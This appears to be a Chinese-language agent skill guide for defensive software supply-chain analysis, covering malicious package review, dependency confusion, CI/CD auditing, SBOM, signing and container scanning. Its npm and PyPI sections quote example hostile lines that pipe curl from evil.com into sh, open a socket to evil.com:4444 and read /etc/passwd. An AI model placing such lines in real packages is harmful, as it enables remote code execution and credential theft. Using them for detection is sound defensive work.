---
name: supply-chain-reverse-engineering
description: 软件供应链安全逆向工程。依赖混淆攻击（dependency confusion / typosquatting）检测与分析；恶意包分析（npm / PyPI / RubyGems / Maven / crates.io / Go modules）；CI/CD 管道投毒（GitHub Actions / GitLab CI / Jenkins）；构建系统篡改；SBOM 生成与审计（CycloneDX / SPDX）；代码签名验证（Sigstore / GPG / Notary）；开源组件漏洞追溯（OSV / Snyk / Dependabot）；容器镜像供应链；SolarWinds / Codecov / XZ Utils 类事件分析方法论。配合 packrev / containerrev / vulnrev / malrev 用。
---

# 软件供应链安全逆向

## 适用场景

- 分析可疑开源包是否含恶意代码（npm / PyPI / Maven / RubyGems / crates.io）。
- 检测 dependency confusion / typosquatting 攻击。
- 审计 CI/CD 管道安全：GitHub Actions / GitLab CI / Jenkins 配置。
- 生成 + 审计 SBOM 追溯依赖风险。
- 分析供应链攻击事件（SolarWinds / XZ Utils / event-stream）。
- 验证代码签名与构建可重复性。
- 容器镜像供应链安全（base image / layer 分析）。

## 不适用

- 常规 CVE 漏洞扫描 → `vulnrev`。
- 恶意软件行为分析 → `malrev`。
- 容器运行时安全 → `containerrev`。

---

## 攻击面全景

```text
源码层:
  代码仓库    → 账号劫持 / PR 投毒 / 维护者社工 (XZ Utils 模式)
  开源依赖    → Typosquatting / Dependency Confusion / 包接管 / Star Jacking
  传递依赖    → 深层依赖更难审计

构建层:
  CI/CD 管道  → GitHub Actions 第三方 action / shared runner / 构建脚本注入
  构建环境    → 编译器后门 (Thompson attack) / 工具链篡改
  签名        → 密钥泄漏 / 签名验证缺失 / 弱算法

分发层:
  包注册表    → 账号接管 / 审核不足 / 镜像投毒
  容器镜像    → Base image 投毒 / 恶意 layer / mutable tag
  二进制分发  → CDN/DNS 劫持 / 下载链接篡改
```

---

## 恶意包分析

### npm

```bash
# 检查包信息
npm view <package> --json
npm view <package> scripts                 # 最关键!

# 危险 scripts:
# install / preinstall / postinstall → 安装时自动执行
# 看是否有: curl | sh / wget / node -e / eval / child_process

# 解包手动审查
npm pack <package>
tar xzf <package>-*.tgz
cat package/package.json | jq '.scripts'

# 恶意模式:
# require('child_process').exec("curl http://evil.com/|sh")
# eval(Buffer.from('...','base64').toString())
# process.env → 窃取环境变量 (CI secret / AWS key)
# dns.resolve → DNS exfil
# fs.readFileSync('/etc/passwd')

# 工具
npm audit                                  # 已知 CVE
npx socket <package>                       # Socket.dev 分析
```

### PyPI

```bash
# 下载不安装
pip download <package> --no-deps -d /tmp/pkg/
cd /tmp/pkg && unzip *.whl || tar xzf *.tar.gz

# 关键: setup.py 在 pip install 时执行!
# 恶意 setup.py:
# os.system("curl http://evil.com/payload | sh")
# exec(base64.b64decode("..."))
# import socket; socket.connect(("evil.com", 4444))

# 工具
pip-audit                                  # 已知 CVE
safety check                               # 已知 CVE
bandit -r .                                # 静态分析
```

### Maven / Gradle

```bash
mvn dependency:tree
mvn org.owasp:dependency-check-maven:check

# 恶意模式:
# maven-antrun-plugin 执行系统命令
# 自定义 Gradle task: Runtime.exec(...)
# 资源文件含恶意 class
```

### Go / Rust / RubyGems

```bash
# Go
govulncheck ./...
# 注意: init() 在 import 时自动执行; go generate 执行任意命令

# Rust
cargo audit
cargo crev                                 # 社区代码审查

# Ruby
bundle audit check
gem contents <gem> | head -20
```

---

## Dependency Confusion

```text
攻击原理 (Alex Birsan 2021):
  1. 公司内部用 @company/my-lib (私有包)
  2. 攻击者在公共 npm/PyPI 注册同名 my-lib
  3. 包管理器优先安装公共版本 (更高版本号)
  4. 恶意代码在安装时执行

检测:
  - 检查 .npmrc / pip.conf 是否正确配置 scope → 私有 registry
  - 在公共 registry 注册占位包 (防御性注册)
  - 检查是否有 scope (@company/) 前缀
  - 审计 lockfile 中包来源

防御:
  npm:    .npmrc 中 @company:registry=https://private.registry/
  pip:    --index-url 指向私有源, 不加 --extra-index-url
  Maven:  settings.xml 中仅配置私有仓库
  Go:     GONOSUMCHECK / GONOSUMDB / GOPRIVATE
```

---

## CI/CD 管道安全

### GitHub Actions

```yaml
# 危险模式:
# 1. 第三方 action 不固定版本
- uses: some-action@main                   # 危险! 可被篡改
- uses: some-action@v1                     # 稍好但 tag 可移动
- uses: some-action@abc123def              # 最安全: commit hash

# 2. 注入环境变量
- run: echo "${{ github.event.issue.title }}"  # 可注入 shell 命令

# 3. GITHUB_TOKEN 权限过大
permissions:
  contents: write                          # 应该用最小权限

# 4. 自托管 runner → 多仓库共享 → 跨仓库攻击

# 审计 checklist:
# □ 所有 action 是否固定到 commit hash
# □ GITHUB_TOKEN permissions 最小化
# □ secrets 是否泄漏到日志
# □ PR 触发的 workflow 权限
# □ 自托管 runner 隔离
```

### 通用 CI/CD

```text
GitLab CI:
  - shared runner → 其他项目可能被攻击
  - include: remote → 远程 YAML 注入
  - 缓存投毒

Jenkins:
  - 插件漏洞 (历史重灾区)
  - Groovy sandbox escape
  - credentials 管理

通用:
  - 构建脚本 (Makefile / Gradle / Cargo build.rs) 执行任意代码
  - 环境变量注入
  - 缓存/制品投毒
```

---

## SBOM (Software Bill of Materials)

```bash
# CycloneDX (推荐)
# npm
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
# Python
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json
# Go
cyclonedx-gomod app -json -output sbom.json
# Java
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom

# SPDX
# syft (最通用)
syft dir:. -o spdx-json > sbom.spdx.json
syft <image>:<tag> -o cyclonedx-json > sbom.json

# 审计 SBOM
grype sbom:sbom.json                       # 查已知漏洞
osv-scanner --sbom sbom.json               # Google OSV

# 对比 SBOM
# diff old-sbom.json new-sbom.json → 检测新增/变更依赖
```

---

## 代码签名验证

```bash
# Sigstore (cosign)
cosign verify <image>                      # 容器镜像签名验证
cosign verify-blob --signature sig.sig --cert cert.pem file

# GPG
gpg --verify file.sig file

# npm (provenance)
npm audit signatures                       # 验证 npm 包签名

# Go
GONOSUMCHECK= go mod verify               # 验证 go.sum

# Python (PEP 740 — attestations)
# PyPI 正在推进签名验证

# macOS
codesign -v --deep app.app
spctl --assess app.app

# Windows (Authenticode)
signtool verify /pa /v file.exe

# 可重复构建 (Reproducible Builds)
# 同源码 + 同构建环境 → 应得到相同二进制
# 工具: reprotest / diffoscope
diffoscope build1/output build2/output
```

---

## 容器镜像供应链

```bash
# 镜像扫描
trivy image <image>:<tag>                  # 漏洞扫描
grype <image>:<tag>                        # 另一扫描器
docker scout quickview <image>:<tag>       # Docker 官方

# 镜像 layer 分析
dive <image>:<tag>                         # 交互式 layer 浏览
# 查看每层加了什么文件

# 导出并分析
docker save <image> -o image.tar
tar xf image.tar
# manifest.json → layer 列表
# 逐层 tar 解包检查

# cosign 验证签名
cosign verify --certificate-oidc-issuer https://token.actions.githubusercontent.com \
    <image>:<tag>

# SBOM for container
syft <image>:<tag> -o cyclonedx-json

# 基础镜像安全:
# □ 用官方 / verified publisher 镜像
# □ 固定 digest (不用 :latest)
# □ 最小镜像 (distroless / alpine / scratch)
# □ 多阶段构建 (builder → runtime)
```

---

## 经典供应链攻击事件

```text
SolarWinds SUNBURST (2020):
  攻击: 篡改 SolarWinds Orion 构建管道, 植入后门 DLL
  影响: 18000+ 组织 (含美国政府)
  教训: 构建管道是高价值目标; 代码签名不等于安全

Codecov (2021):
  攻击: 篡改 Codecov Bash Uploader 脚本
  影响: CI 环境变量 (含 secrets) 被窃取
  教训: CI 脚本也是供应链的一部分

event-stream (2018):
  攻击: 新维护者在 npm 包中加入恶意依赖 flatmap-stream
  影响: 窃取 Copay 钱包比特币
  教训: 维护者转让是攻击向量

ua-parser-js (2021):
  攻击: npm 包被劫持, 发布含挖矿/木马的版本
  影响: 周下载 700 万的包
  教训: 高流量包是高价值目标

XZ Utils (2024):
  攻击: "Jia Tan" 花 2 年成为可信维护者, 在构建脚本中植入后门
  影响: 差点影响所有 Linux 发行版 sshd
  教训: 社工 + 长期渗透; 构建脚本比源码更难审计

PyTorch nightly (2022):
  攻击: Dependency Confusion → torchtriton 包在 PyPI 抢注
  影响: pip install 时执行恶意代码
  教训: Dependency confusion 仍然有效

分析方法论:
  1. 时间线重建: 第一个恶意 commit / release / download
  2. 植入方式: 代码级 / 构建级 / 分发级
  3. 持久化: 如何保持隐蔽 + 对抗审计
  4. 影响范围: 下游依赖者 + 实际执行环境
  5. 检测方式: 如何发现的 + 自动化检测可行性
  6. IOC 提取: 域名 / IP / hash / 恶意函数签名
```

---

## 工具速查

```text
依赖扫描:
  npm audit / pip-audit / cargo audit / govulncheck / bundle audit
  Snyk / Dependabot / Renovate / Socket.dev

SBOM:
  syft / CycloneDX tools / SPDX tools

漏洞数据库:
  OSV (osv.dev) / NVD / GitHub Advisory / Snyk DB

签名验证:
  cosign (Sigstore) / GPG / Notary v2

容器:
  trivy / grype / dive / docker scout

构建验证:
  reprotest / diffoscope / SLSA framework

CI/CD:
  step-security/harden-runner (GitHub Actions)
  GitGuardian (secret detection)
  Semgrep (CI 配置检查)
```

---

## 实战入口

- **SLSA Framework** — slsa.dev — 软件供应链安全成熟度模型。
- **Sigstore** — sigstore.dev — 开源代码签名基础设施。
- **Socket.dev** — npm/PyPI 包安全分析。
- **Alex Birsan "Dependency Confusion"** — 原始论文。
- **Snyk blog** — 供应链安全研究。
- **CISA Software Supply Chain Security** — 政策指南。
- **Google GUAC / SLSA / OSS-Fuzz** — 谷歌供应链安全项目。
- **npm provenance / PyPI attestations** — 官方签名推进。
- **Russ Cox "Reproducible Builds" talk** — Go 模块安全。
- **OWASP Software Component Verification Standard (SCVS)**。

## 自检（接到目标 30 分钟内回答）

1. 分析目标？（特定包 / 整个项目依赖 / CI/CD 管道 / 攻击事件）
2. 包生态？（npm / PyPI / Maven / Go / Rust / Ruby / 多语言）
3. 已有 SBOM 吗？（CycloneDX / SPDX / 需要生成）
4. CI/CD 平台？（GitHub Actions / GitLab CI / Jenkins / 其他）
5. 私有包？（是否存在 dependency confusion 风险）
6. 签名验证？（cosign / GPG / 无）
7. 容器？（需要镜像分析？base image 审计？）
8. 已知 IOC？（特定恶意包名 / 域名 / hash）
9. 合规？（SLSA level / NIST SSDF / FedRAMP）
10. 相邻技能？（packrev / containerrev / vulnrev / malrev / code-audit）

## 相邻技能

- `packrev` — 打包格式 / 加壳分析。
- `containerrev` — 容器运行时安全。
- `vulnrev` — 依赖中已知 CVE 漏洞追溯。
- `malrev` — 恶意代码行为分析。
- `code-audit` — 源码级安全审计。
- `mlrev` — ML 模型供应链（pickle / 恶意模型）。